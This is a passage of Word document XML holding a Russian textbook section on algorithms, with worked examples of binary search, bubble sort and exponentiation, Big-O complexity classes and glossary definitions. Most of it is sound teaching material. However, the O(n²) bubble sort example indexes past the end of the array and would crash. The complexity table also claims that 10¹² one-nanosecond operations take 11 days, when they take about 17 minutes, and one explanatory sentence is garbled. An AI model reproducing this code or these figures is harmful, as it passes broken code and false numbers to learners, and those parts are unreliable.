    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Ищем `x = 10`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: left = 0, right = 6, mid = 3</w:t>
        <w:br/>
        <w:t xml:space="preserve">       A[3] = 7 &lt; 10 → left = 4</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: left = 4, right = 6, mid = 5</w:t>
        <w:br/>
        <w:t xml:space="preserve">       A[5] = 11 &gt; 10 → right = 4</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 3: left = 4, right = 4, mid = 4</w:t>
        <w:br/>
        <w:t xml:space="preserve">       A[4] = 9 &lt; 10 → left = 5</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 4: left = 5, right = 4 (left &gt; right) → вернуть -1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Не найдено (-1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(log n) — в два раза быстрее каждый шаг сокращает область поиска.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Сортировка пузырьком (Bubble Sort)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проходим по массиву, сравниваем соседние элементы. Если левый больше правого — меняем местами. Повторяем, пока массив не станет отсортированным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесное описание:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять массив A размером n</w:t>
        <w:br/>
        <w:t>2. Повторять n-1 раз:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   2.1. Для каждого индекса i от 0 до n-2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        - Если A[i] &gt; A[i+1], поменять их местами</w:t>
        <w:br/>
        <w:t>3. Массив отсортирован</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм СортировкаПузырьком(A, n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Для j от 0 до n-2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Для i от 0 до n-2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            Если A[i] &gt; A[i+1], то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">                Поменять A[i] и A[i+1] местами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def bubble_sort(arr):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    n = len(arr)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for j in range(n - 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        for i in range(n - 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if arr[i] &gt; arr[i + 1]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">                arr[i], arr[i + 1] = arr[i + 1], arr[i]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример выполнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Массив: `[5, 2, 9, 1, 5, 6]`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Проход 1:</w:t>
        <w:br/>
        <w:t>[5, 2, 9, 1, 5, 6]</w:t>
        <w:br/>
        <w:t>[2, 5, 9, 1, 5, 6]  (поменяли 5 и 2)</w:t>
        <w:br/>
        <w:t>[2, 5, 1, 9, 5, 6]  (поменяли 9 и 1)</w:t>
        <w:br/>
        <w:t>[2, 5, 1, 5, 9, 6]  (поменяли 9 и 5)</w:t>
        <w:br/>
        <w:t>[2, 5, 1, 5, 6, 9]  (поменяли 9 и 6)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Проход 2:</w:t>
        <w:br/>
        <w:t>[2, 1, 5, 5, 6, 9]  (поменяли 5 и 1)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Проход 3:</w:t>
        <w:br/>
        <w:t>[1, 2, 5, 5, 6, 9]  (поменяли 2 и 1)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Проходы 4-5: нет изменений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `[1, 2, 5, 5, 6, 9]`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(n²) — медленно, но понятно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Возведение в степень (наивный алгоритм)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислить \(a^n\) (a в степени n).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Наивный алгоритм (умножаем n раз):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм Степень(a, n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Для i от 1 до n:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result = result * a</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть result</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def power(a, n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result *= a</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return result</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> \(2^5\)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: result = 1 * 2 = 2</w:t>
        <w:br/>
        <w:t>Шаг 2: result = 2 * 2 = 4</w:t>
        <w:br/>
        <w:t>Шаг 3: result = 4 * 2 = 8</w:t>
        <w:br/>
        <w:t>Шаг 4: result = 8 * 2 = 16</w:t>
        <w:br/>
        <w:t>Шаг 5: result = 16 * 2 = 32</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 32.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(n) — n умножений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Улучшенный алгоритм (быстрое возведение в степень):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Идея: \(a^{2n} = (a^n)^2\), \(a^{2n+1} = a \cdot (a^n)^2\)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм БыстраяСтепень(a, n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Если n = 0, вернуть 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Если n чётное, то:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        half = БыстраяСтепень(a, n/2)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Вернуть half * half</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Иначе:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        half = БыстраяСтепень(a, (n-1)/2)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        Вернуть a * half * half</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(log n) — гораздо быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> \(2^{10}\)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2^10 = (2^5)^2</w:t>
        <w:br/>
        <w:t>2^5 = 2 * (2^2)^2 = 2 * 16 = 32</w:t>
        <w:br/>
        <w:t>2^2 = (2^1)^2 = 4</w:t>
        <w:br/>
        <w:t>2^1 = 2 * (2^0)^2 = 2 * 1 = 2</w:t>
        <w:br/>
        <w:t>2^0 = 1</w:t>
        <w:br/>
        <w:br/>
        <w:t>2^10 = (32)^2 = 1024</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вместо 10 умножений делаем 4 (log₂(10) ≈ 3.3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.6. Сложность алгоритма</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое сложность?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность алгоритма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это оценка </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>количества ресурсов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (времени или памяти), необходимых для выполнения алгоритма в зависимости от размера входных данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Есть два типа сложности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Временная сложность** — сколько **операций** выполняется</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Пространственная сложность** — сколько **памяти** используется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Обычно на экзаменах спрашивают про </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>временную сложность</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Нотация O-большое (Big-O)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O-большое</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оценить</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сложность алгоритма, отбросив константы и младшие члены.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формальное определение (не обязательно знать на экзамене):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Функция \(f(n) = O(g(n))\), если существуют константы \(c &gt; 0\) и \(n_0\), такие что для всех \(n \geq n_0\) выполняется \(f(n) \leq c \cdot g(n)\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Простыми словами:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> O(g(n)) — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>верхняя граница</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> роста времени выполнения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные классы сложности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сложность      | Название            | Пример алгоритма               | Скорость        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| -------------- | ------------------- | ------------------------------ | --------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(1)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Константная         | Обращение к элементу массива   | Очень быстро    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(log n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Логарифмическая     | Бинарный поиск                 | Быстро          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Линейная            | Линейный поиск                 | Нормально       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n log n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Линейно-логарифмическая | QuickSort, MergeSort       | Хорошо          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n²)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Квадратичная        | Сортировка пузырьком           | Медленно        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(2ⁿ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Экспоненциальная    | Перебор всех подмножеств       | Очень медленно  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>O(n!)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Факториальная       | Перебор всех перестановок (TSP)| Катастрофа      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. O(1) — константная сложность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def get_first(arr):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return arr[0]  # одна операция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Не важно, массив из 10 элементов или из миллиона — выполняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одна операция</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. O(n) — линейная сложность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def find_max(arr):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    max_val = arr[0]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for x in arr:  # n итераций</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if x &gt; max_val:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            max_val = x</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return max_val</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для массива из n элементов выполняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n операций</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. O(n²) — квадратичная сложность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def bubble_sort(arr):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    n = len(arr)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(n):      # n итераций</w:t>
        <w:br/>
        <w:t xml:space="preserve">        for j in range(n):  # n итераций (вложенный цикл)</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if arr[j] &gt; arr[j+1]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">                arr[j], arr[j+1] = arr[j+1], arr[j]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Два вложенных цикла → n × n = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n² операций</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. O(log n) — логарифмическая сложность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def binary_search(arr, x):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    left, right = 0, len(arr) - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    while left &lt;= right:  # каждый шаг область поиска уменьшается вдвое</w:t>
        <w:br/>
        <w:t xml:space="preserve">        mid = (left + right) // 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if arr[mid] == x:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return mid</w:t>
        <w:br/>
        <w:t xml:space="preserve">        elif arr[mid] &lt; x:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            left = mid + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">        else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            right = mid - 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return -1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для массива из n элементов выполняется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>log₂(n) итераций</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> n = 1024 → log₂(1024) = 10 итераций. Вместо 1024 проверок (линейный поиск) делаем всего 10. Охренеть какая разница.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. O(2ⁿ) — экспоненциальная сложность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def fibonacci(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if n &lt;= 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return n</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return fibonacci(n-1) + fibonacci(n-2)  # два рекурсивных вызова</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для каждого вызова делается ещё 2 вызова → дерево вызовов растёт экспоненциально.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fibonacci(10) делает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>177 вызовов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. fibonacci(30) — уже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2 692 537 вызовов</w:t>
      </w:r>
      <w:r>
        <w:t>. Компьютер будет думать несколько секунд. fibonacci(50) — вообще не дождёшься.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Использовать динамическое программирование (как в главе 4.4) — сложность станет O(n).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнение сложностей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пусть n = 1 000 000 (миллион элементов):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сложность      | Количество операций | Время (условно, 1 операция = 1 нс) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| -------------- | ------------------- | ----------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(1)           | 1                   | 1 нс                                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(log n)       | 20                  | 20 нс                               |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(n)           | 1 000 000           | 1 мс                                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(n log n)     | 20 000 000          | 20 мс                               |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(n²)          | 10¹²                | 11 дней                             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| O(2ⁿ)          | невообразимо        | больше возраста Вселенной           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сложность имеет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>огромное значение</w:t>
      </w:r>
      <w:r>
        <w:t>. Разница между O(n log n) и O(n²) может быть критичной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — конечная последовательность чётко определённых действий для решения задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дискретность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм состоит из отдельных шагов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Детерминированность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — каждый шаг алгоритма однозначно определён.</w:t>
